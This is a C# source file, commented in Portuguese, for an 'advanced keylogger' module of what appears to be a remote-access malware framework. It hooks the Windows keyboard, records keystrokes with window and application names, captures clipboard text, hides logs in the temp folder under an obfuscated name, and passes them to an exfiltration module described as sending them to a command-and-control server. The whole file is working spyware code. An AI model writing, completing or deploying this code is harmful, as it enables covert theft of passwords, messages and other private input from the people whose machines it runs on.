using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using XYZ.modules.reporters;

namespace XYZ.modules
{
    /// <summary>
    /// Keylogger avançado com contexto de aplicação, clipboard monitoring e timestamps
    /// </summary>
    public class AdvancedKeyloggerModule
    {
        private bool isRunning = false;
        private Thread keylogThread;
        private StringBuilder logBuffer;
        private string currentWindow = "";
        private string currentApplication = "";
        private DateTime sessionStart;
        private readonly object bufferLock = new object();
        
        // Hook do teclado
        private IntPtr hookID = IntPtr.Zero;
        private LowLevelKeyboardProc hookCallback;
        
        // Clipboard monitoring
        private string lastClipboardText = "";
        private System.Threading.Timer clipboardTimer;

        // Delegates e estruturas Win32
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        public AdvancedKeyloggerModule()
        {
            logBuffer = new StringBuilder();
            sessionStart = DateTime.UtcNow;
            hookCallback = HookCallback;
            
            SecureLogger.LogInfo("Keylogger", "Advanced keylogger module initialized");
        }

        /// <summary>
        /// Inicia captura de teclas
        /// </summary>
        public void Start()
        {
            if (isRunning)
            {
                SecureLogger.LogWarning("Keylogger", "Already running");
                return;
            }

            try
            {
                isRunning = true;

                // Create a dedicated thread for the hook message loop
                var hookThread = new Thread(() =>
                {
                    try
                    {
                        using (Process curProcess = Process.GetCurrentProcess())
                        using (ProcessModule curModule = curProcess.MainModule)
                        {
                            hookID = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback,
                                GetModuleHandle(curModule.ModuleName), 0);
                        }

                        // Message loop is required for hooks
                        Application.Run();
                    }
                    catch (Exception ex)
                    {
                        SecureLogger.LogError("Keylogger.Loop", ex);
                    }
                    finally
                    {
                        if (hookID != IntPtr.Zero)
                        {
                            UnhookWindowsHookEx(hookID);
                            hookID = IntPtr.Zero;
                        }
                    }
                });
                
                hookThread.SetApartmentState(ApartmentState.STA);
                hookThread.IsBackground = true;
                hookThread.Start();

                // Inicia thread de monitoramento de contexto
                keylogThread = new Thread(ContextMonitoringThread);
                keylogThread.IsBackground = true;
                keylogThread.Start();

                // Inicia monitoramento de clipboard
                StartClipboardMonitoring();

                // Log inicial
                LogEvent("=== Keylogger Session Started ===");

                SecureLogger.LogInfo("Keylogger", "Keylogger started successfully (threaded)");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.Start", ex);
                isRunning = false;
            }
        }

        /// <summary>
        /// Para captura de teclas
        /// </summary>
        public void Stop()
        {
            if (!isRunning)
                return;

            try
            {
                isRunning = false;

                // Remove hook
                if (hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hookID);
                    hookID = IntPtr.Zero;
                }

                // Para threads
                if (clipboardTimer != null)
                    clipboardTimer.Dispose();
                
                LogEvent("=== Keylogger Session Ended ===");

                SecureLogger.LogInfo("Keylogger", "Keylogger stopped");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.Stop", ex);
            }
        }

        /// <summary>
        /// Callback do hook de teclado
        /// </summary>
        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    
                    // Atualiza contexto da janela se mudou
                    UpdateWindowContext();

                    // Traduz tecla
                    string key = TranslateKey(vkCode);
                    
                    // Loga tecla com contexto
                    if (!string.IsNullOrEmpty(key))
                    {
                        LogKey(key);
                    }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.Hook", ex);
            }

            return CallNextHookEx(hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Traduz código virtual de tecla para string legível
        /// </summary>
        private string TranslateKey(int vkCode)
        {
            try
            {
                Keys key = (Keys)vkCode;

                // Teclas especiais
                switch (key)
                {
                    case Keys.Enter:
                        return "[ENTER]\n";
                    case Keys.Back:
                        return "[BACKSPACE]";
                    case Keys.Tab:
                        return "[TAB]";
                    case Keys.Space:
                        return " ";
                    case Keys.Escape:
                        return "[ESC]";
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                        return "[CTRL]";
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                        return "[SHIFT]";
                    case Keys.LMenu:
                    case Keys.RMenu:
                        return "[ALT]";
                    case Keys.Delete:
                        return "[DEL]";
                    case Keys.Home:
                        return "[HOME]";
                    case Keys.End:
                        return "[END]";
                    case Keys.PageUp:
                        return "[PGUP]";
                    case Keys.PageDown:
                        return "[PGDN]";
                    case Keys.Left:
                        return "[LEFT]";
                    case Keys.Right:
                        return "[RIGHT]";
                    case Keys.Up:
                        return "[UP]";
                    case Keys.Down:
                        return "[DOWN]";
                    default:
                        // Letras e números
                        if ((vkCode >= 65 && vkCode <= 90) || (vkCode >= 48 && vkCode <= 57))
                        {
                            return key.ToString();
                        }
                        return "";
                }
            }
            catch
            {
                return "";
            }
        }

        /// <summary>
        /// Atualiza contexto da janela ativa
        /// </summary>
        private void UpdateWindowContext()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                
                // Obtém título da janela
                StringBuilder windowTitle = new StringBuilder(256);
                GetWindowText(hwnd, windowTitle, 256);
                string newWindow = windowTitle.ToString();

                // Obtém nome da aplicação
                uint processId;
                GetWindowThreadProcessId(hwnd, out processId);
                string newApp = "";
                
                try
                {
                    Process process = Process.GetProcessById((int)processId);
                    newApp = process.ProcessName;
                }
                catch { }

                // Se mudou a janela, loga o contexto
                if (newWindow != currentWindow && !string.IsNullOrEmpty(newWindow))
                {
                    currentWindow = newWindow;
                    currentApplication = newApp;
                    
                    LogEvent(string.Format("\n[{0:HH:mm:ss}] Window: {1} | App: {2}\n", DateTime.Now, currentWindow, currentApplication));
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.UpdateContext", ex);
            }
        }

        /// <summary>
        /// Loga tecla pressionada
        /// </summary>
        private void LogKey(string key)
        {
            // Send to realtime reporter
            try { KeylogReporter.AddKeystroke(key, currentWindow, currentApplication); } catch {}

            lock (bufferLock)
            {
                logBuffer.Append(key);
                
                // Auto-flush se buffer muito grande
                if (logBuffer.Length > 10000)
                {
                    FlushBuffer();
                }
            }
        }

        /// <summary>
        /// Loga evento especial
        /// </summary>
        private void LogEvent(string eventText)
        {
            lock (bufferLock)
            {
                logBuffer.AppendLine(eventText);
            }
        }

        /// <summary>
        /// Thread de monitoramento contínuo de contexto
        /// </summary>
        private void ContextMonitoringThread()
        {
            while (isRunning)
            {
                try
                {
                    Thread.Sleep(1000); // Verifica a cada 1 segundo
                }
                catch
                {
                    break;
                }
            }
        }

        /// <summary>
        /// Inicia monitoramento de clipboard
        /// </summary>
        private void StartClipboardMonitoring()
        {
            clipboardTimer = new System.Threading.Timer((state) =>
            {
                try
                {
                    if (Clipboard.ContainsText())
                    {
                        string clipboardText = Clipboard.GetText();
                        
                        if (clipboardText != lastClipboardText && !string.IsNullOrEmpty(clipboardText))
                        {
                            lastClipboardText = clipboardText;
                            
                            // Limita tamanho
                            if (clipboardText.Length > 500)
                                clipboardText = clipboardText.Substring(0, 500) + "...";
                            
                            LogEvent(string.Format("\n[CLIPBOARD @ {0:HH:mm:ss}]\n{1}\n", DateTime.Now, clipboardText));
                        }
                    }
                }
                catch (Exception ex)
                {
                    SecureLogger.LogError("Keylogger.Clipboard", ex);
                }
            }, null, TimeSpan.FromSeconds(5), TimeSpan.FromSeconds(5));
        }

        /// <summary>
        /// Obtém logs capturados
        /// </summary>
        public string GetLogs()
        {
            lock (bufferLock)
            {
                return logBuffer.ToString();
            }
        }

        /// <summary>
        /// Limpa buffer de logs
        /// </summary>
        public void ClearLogs()
        {
            lock (bufferLock)
            {
                logBuffer.Clear();
            }
        }

        /// <summary>
        /// Flush buffer para arquivo
        /// </summary>
        private void FlushBuffer()
        {
            try
            {
                string logPath = Path.Combine(Path.GetTempPath(), 
                    SecurityUtilities.ObfuscateFilename("keylogs.txt"));

                lock (bufferLock)
                {
                    File.AppendAllText(logPath, logBuffer.ToString());
                    logBuffer.Clear();
                }

                SecureLogger.LogDebug("Keylogger", "Buffer flushed to file");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.Flush", ex);
            }
        }

        /// <summary>
        /// Obtém estatísticas de captura
        /// </summary>
        public Dictionary<string, object> GetStatistics()
        {
            return new Dictionary<string, object>
            {
                { "IsRunning", isRunning },
                { "SessionStartTime", sessionStart },
                { "SessionDuration", DateTime.UtcNow - sessionStart },
                { "BufferSize", logBuffer.Length },
                { "CurrentWindow", currentWindow },
                { "CurrentApplication", currentApplication }
            };
        }

        /// <summary>
        /// Salva logs e envia para C2
        /// </summary>
        public async System.Threading.Tasks.Task SaveAndSendLogs()
        {
            try
            {
                string logs = GetLogs();
                
                if (!string.IsNullOrEmpty(logs))
                {
                    // Salva localmente
                    FlushBuffer();
                    
                    // Envia para C2
                    byte[] logBytes = Encoding.UTF8.GetBytes(logs);
                    var exfiltrator = new DataExfiltrationModule();
                    await exfiltrator.ExfiltrateBytes(logBytes, 
                        string.Format("keylog_{0:yyyyMMdd_HHmmss}.txt", DateTime.UtcNow), 
                        "keylog");
                    
                    ClearLogs();
                    
                    SecureLogger.LogInfo("Keylogger", "Logs saved and sent to C2");
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Keylogger.SaveAndSend", ex);
            }
        }
    }
}
